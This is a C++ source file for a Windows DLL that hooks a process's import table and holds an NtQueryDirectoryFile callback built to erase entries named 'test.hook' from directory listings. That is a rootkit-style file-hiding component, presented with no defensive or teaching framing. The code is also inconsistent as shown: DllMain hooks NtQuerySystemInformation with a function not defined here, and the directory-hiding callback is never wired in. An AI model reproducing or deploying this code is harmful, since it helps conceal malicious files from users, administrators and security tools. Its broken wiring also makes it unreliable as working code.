#include <windows.h>
#include <stdio.h>
#include "dllmain.h"
#include <string>
#include <Shlwapi.h>

#if defined _M_X64
#pragma comment(lib, "libMinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif

#define NT_SUCCESS(Status) ((NTSTATUS)(Status)>=0)

typedef LONG NTSTATUS;
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)

typedef struct _IO_STATUS_BLOCK
{
    NTSTATUS Status;
    ULONG Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} ANSI_STRING, * PANSI_STRING;

typedef enum _FILE_INFORMATION_CLASS
{
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileIdBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(IN PVOID ApcContext, IN PIO_STATUS_BLOCK   IoStatusBlock, IN ULONG Reserved);

typedef struct _FILE_BOTH_DIRECTORY_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG Unknown;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaInformationLength;
    UCHAR AlternateNameLength;
    WCHAR AlternateName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, * PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION
{
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;


typedef struct _FILE_FULL_DIR_INFORMATION
{
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    WCHAR         FileName[1];
} FILE_FULL_DIR_INFORMATION, * PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION
{
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    LARGE_INTEGER FileId;
    WCHAR         FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, * PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION
{
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    CCHAR         ShortNameLength;
    WCHAR         ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, * PFILE_NAMES_INFORMATION;


DWORD_PTR g_originalFuncAddr;

int hook(PCSTR funcToHook, PCSTR dllToHook, DWORD_PTR newFuncAddr)
{
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS NTHeader;
    PIMAGE_OPTIONAL_HEADER optionalHeader;
    IMAGE_DATA_DIRECTORY importDirectory;
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor;

    DWORD_PTR baseAddress = (DWORD_PTR)GetModuleHandle(NULL);

    dosHeader = (PIMAGE_DOS_HEADER)(baseAddress);
    NTHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
    optionalHeader = &NTHeader->OptionalHeader;
    importDirectory = optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + importDirectory.VirtualAddress);

    int index = 0;
    char* dllName;
    while (importDescriptor[index].Characteristics != 0)
    {
        dllName = (char*)(baseAddress + importDescriptor[index].Name);
        if (!strcmp(dllToHook, dllName))
            break;
        index++;
    }
    if (importDescriptor[index].Characteristics == 0)
    {
        return 0;
    }

    PIMAGE_THUNK_DATA thunkILT;
    PIMAGE_THUNK_DATA thunkIAT;
    PIMAGE_IMPORT_BY_NAME nameData;

    thunkILT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].OriginalFirstThunk);
    thunkIAT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].FirstThunk);
    if (thunkIAT == NULL || thunkILT == NULL)
    {
        return 0;
    }

    while ((thunkILT->u1.AddressOfData != 0) & (!(thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG)))
    {
        nameData = (PIMAGE_IMPORT_BY_NAME)(baseAddress + thunkILT->u1.AddressOfData);
        if (!strcmp(funcToHook, (char*)nameData->Name))
            break;
        thunkIAT++;
        thunkILT++;
    }

    DWORD dwOld = NULL;
    g_originalFuncAddr = thunkIAT->u1.Function;
    VirtualProtect((LPVOID) & (thunkIAT->u1.Function), sizeof(DWORD_PTR), PAGE_READWRITE, &dwOld);
    thunkIAT->u1.Function = newFuncAddr;
    VirtualProtect((LPVOID) & (thunkIAT->u1.Function), sizeof(DWORD_PTR), dwOld, NULL);

    return 1;
}

ULONG getDirEntryFileLength(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
{
    ULONG ulResult = 0;
    switch (FileInfoClass)
    {
    case FileDirectoryInformation:
        ulResult = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
        break;
    case FileFullDirectoryInformation:
        ulResult = (ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
        break;
    case FileIdFullDirectoryInformation:
        ulResult = (ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
        break;
    case FileBothDirectoryInformation:
        ulResult = (ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
        break;
    case FileIdBothDirectoryInformation:
        ulResult = (ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
        break;
    case FileNamesInformation:
        ulResult = (ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
        break;
    }
    return ulResult;
}

void setDirEntryLenToNext(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass, DWORD value)
{
    switch (FileInfoClass)
    {
    case FileDirectoryInformation:
        ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
        break;
    case FileFullDirectoryInformation:
        ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
        break;
    case FileIdFullDirectoryInformation:
        ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
        break;
    case FileBothDirectoryInformation:
        ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
        break;
    case FileIdBothDirectoryInformation:
        ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
        break;
    case FileNamesInformation:
        ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
        break;
    }
}

PVOID getDirEntryFileName(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
{
    PVOID pvResult = NULL;
    switch (FileInfoClass)
    {
    case FileDirectoryInformation:
        pvResult = (PVOID) & ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
        break;
    case FileFullDirectoryInformation:
        pvResult = (PVOID) & ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
        break;
    case FileIdFullDirectoryInformation:
        pvResult = (PVOID) & ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
        break;
    case FileBothDirectoryInformation:
        pvResult = (PVOID) & ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
        break;
    case FileIdBothDirectoryInformation:
        pvResult = (PVOID) & ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
        break;
    case FileNamesInformation:
        pvResult = (PVOID) & ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
        break;
    }
    return pvResult;
}

DWORD getDirEntryLenToNext(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
{
    DWORD dwResult = 0;
    switch (FileInfoClass)
    {
    case FileDirectoryInformation:
        dwResult = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
        break;
    case FileFullDirectoryInformation:
        dwResult = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
        break;
    case FileIdFullDirectoryInformation:
        dwResult = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
        break;
    case FileBothDirectoryInformation:
        dwResult = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
        break;
    case FileIdBothDirectoryInformation:
        dwResult = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
        break;
    case FileNamesInformation:
        dwResult = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
        break;
    }
    return dwResult;
}

BOOL config_CheckString(char* str, char* str2)
{
    if (StrStrIA(str, str2) != NULL)
        return TRUE;
    return FALSE;
}

extern "C" NTSYSAPI NTSTATUS NTAPI RtlUnicodeStringToAnsiString(PANSI_STRING  DestinationString, PUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString);

extern "C" NTSYSAPI VOID NTAPI RtlFreeAnsiString(PANSI_STRING AnsiString);

extern "C" NTSYSAPI NTSTATUS NTAPI NtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);


typedef NTSTATUS(WINAPI* NtQueryDirectoryFileNext)(HANDLE hFile, HANDLE hEvent, PIO_APC_ROUTINE IoApcRoutine, PVOID IoApcContext,
    PIO_STATUS_BLOCK pIoStatusBlock, PVOID FileInformationBuffer, ULONG FileInformationBufferLength, FILE_INFORMATION_CLASS FileInfoClass,
    BOOLEAN bReturnOnlyOneEntry, PUNICODE_STRING PathMask, BOOLEAN bRestartQuery);

NtQueryDirectoryFileNext Real_NtQueryDirectoryFile = NULL;

NTSTATUS WINAPI NtQueryDirectoryFileCallback(HANDLE hFile, HANDLE hEvent, PIO_APC_ROUTINE IoApcRoutine, PVOID IoApcContext,
    PIO_STATUS_BLOCK pIoStatusBlock, PVOID FileInformationBuffer, ULONG FileInformationBufferLength, FILE_INFORMATION_CLASS FileInfoClass,
    BOOLEAN bReturnOnlyOneEntry, PUNICODE_STRING PathMask, BOOLEAN bRestartQuery)
{

    NTSTATUS rc;
    const wchar_t* ConfigHiddenFileDir = L"test.hook"; //Name of the Folder to be Hide
    rc = Real_NtQueryDirectoryFile(hFile, hEvent, IoApcRoutine, IoApcContext, pIoStatusBlock,
        FileInformationBuffer, FileInformationBufferLength, FileInfoClass, bReturnOnlyOneEntry,
        PathMask, bRestartQuery);

    if (NT_SUCCESS(rc) && (FileInfoClass == FileDirectoryInformation || FileInfoClass == FileFullDirectoryInformation ||
        FileInfoClass == FileIdFullDirectoryInformation || FileInfoClass == FileBothDirectoryInformation ||
        FileInfoClass == FileIdBothDirectoryInformation || FileInfoClass == FileNamesInformation))
    {

        PVOID p = FileInformationBuffer;
        PVOID pLast = NULL;
        BOOL bLastOne, bFound;
        UNICODE_STRING usName;
        ANSI_STRING asName;

        if (bReturnOnlyOneEntry) 
        {
            usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
            usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);
            RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
            bFound = config_CheckString((CHAR*)ConfigHiddenFileDir, asName.Buffer);
            RtlFreeAnsiString(&asName);

            if (bFound)
            {
                rc = Real_NtQueryDirectoryFile(hFile, hEvent, IoApcRoutine, IoApcContext, pIoStatusBlock,
                    FileInformationBuffer, FileInformationBufferLength, FileInfoClass, bReturnOnlyOneEntry,
                    PathMask, bRestartQuery);

                if (rc != STATUS_SUCCESS)
                    return(rc);

                usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
                usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);
                RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
                bFound = config_CheckString((CHAR*)ConfigHiddenFileDir, asName.Buffer);
                RtlFreeAnsiString(&asName);
            }
        }
        else
        {
            do
            {
                bLastOne = !getDirEntryLenToNext(p, FileInfoClass);
                if (getDirEntryFileLength(p, FileInfoClass))
                {
                    usName.Buffer = (PWSTR)getDirEntryFileName(p, FileInfoClass);
                    usName.Length = (USHORT)getDirEntryFileLength(p, FileInfoClass);
                    RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
                    if (config_CheckString((CHAR*)ConfigHiddenFileDir, asName.Buffer))
                    {
                        RtlFreeAnsiString(&asName);
                        if (bLastOne)
                        {
                            if (p == FileInformationBuffer) rc = 0x80000006;
                            else setDirEntryLenToNext(pLast, FileInfoClass, 0);
                            break;
                        }
                        else
                        {
                            int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
                            int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p, FileInfoClass);
                            RtlCopyMemory(p, (PVOID)((char*)p + getDirEntryLenToNext(p, FileInfoClass)), (DWORD)iLeft);
                            continue;
                        }
                    }
                    RtlFreeAnsiString(&asName);
                }

                pLast = p;
                p = ((char*)p + getDirEntryLenToNext(p, FileInfoClass));
            } while (!bLastOne);
        }
    }
    return rc;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    PCSTR funcToHook = "NtQuerySystemInformation";
    PCSTR dllToHook = "ntdll.dll";

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hook(funcToHook, dllToHook, (DWORD_PTR)&HookedNtQuerySystemInformation);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        hook(funcToHook, dllToHook, g_originalFuncAddr);
        break;
    }
    return TRUE;
}
